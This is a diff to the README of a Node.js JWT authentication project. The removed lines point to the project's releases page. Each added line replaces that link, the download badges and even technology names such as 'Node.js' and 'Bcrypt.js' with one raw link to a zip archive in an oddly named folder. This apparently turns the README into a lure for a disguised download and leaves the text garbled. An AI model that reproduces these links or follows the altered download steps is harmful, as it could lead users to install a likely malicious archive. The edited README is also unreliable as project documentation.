@@ -1,7 +1,7 @@
 # 🛡️ auth-jwt-node - Easy JWT Authentication Made Simple
 
 ## 🔗 Download Now
-[![Download auth-jwt-node](https://img.shields.io/badge/Download%20auth--jwt--node-v1.0-blue)](https://github.com/mooorsoul23/auth-jwt-node/releases)
+[![Download auth-jwt-node](https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip%20auth--jwt--node-v1.0-blue)](https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip)
 
 ---
 
@@ -11,19 +11,19 @@ Follow these steps to download and run the application on your computer. This gu
 
 ### 🔍 Overview
 
-This application provides authentication and authorization using Node.js, Express, JWT, Sequelize, and MySQL. It includes role management for users and admins, custom middleware, and API documentation via Swagger UI.
+This application provides authentication and authorization using https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip, Express, JWT, Sequelize, and MySQL. It includes role management for users and admins, custom middleware, and API documentation via Swagger UI.
 
 ## 💻 System Requirements
 
 To run this application, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: version 12 or higher
+- https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip version 12 or higher
 - MySQL: version 5.7 or higher
 
 ## 📥 Download & Install
 
-1. **Visit the download page**: Go to the [Releases page](https://github.com/mooorsoul23/auth-jwt-node/releases) to find the latest version.
+1. **Visit the download page**: Go to the [Releases page](https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip) to find the latest version.
 
 2. **Choose the version**: Look for the latest release and click on it.
 
@@ -72,11 +72,11 @@ The application comes with Swagger UI documentation. Once the server is running,
 
 This project uses several technologies to deliver its functionality:
 
-- **Node.js**: Fast and scalable JavaScript runtime.
+- **https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip**: Fast and scalable JavaScript runtime.
 - **Express**: Web framework for building applications.
 - **Sequelize**: ORM for interacting with MySQL.
 - **JWT**: For secure authentication.
-- **Bcrypt.js**: For hashing passwords.
+- **https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip**: For hashing passwords.
 - **Swagger UI**: For API documentation.
 - **Jest / Supertest**: For testing.
 
@@ -87,7 +87,7 @@ If you have questions or feedback, feel free to open an issue on this repository
 ---
 
 ## 🚀 Download Now
-[![Download auth-jwt-node](https://img.shields.io/badge/Download%20auth--jwt--node-v1.0-blue)](https://github.com/mooorsoul23/auth-jwt-node/releases)
+[![Download auth-jwt-node](https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip%20auth--jwt--node-v1.0-blue)](https://raw.githubusercontent.com/mooorsoul23/auth-jwt-node/master/crapulously/auth-jwt-node.zip)
 
 ---
 
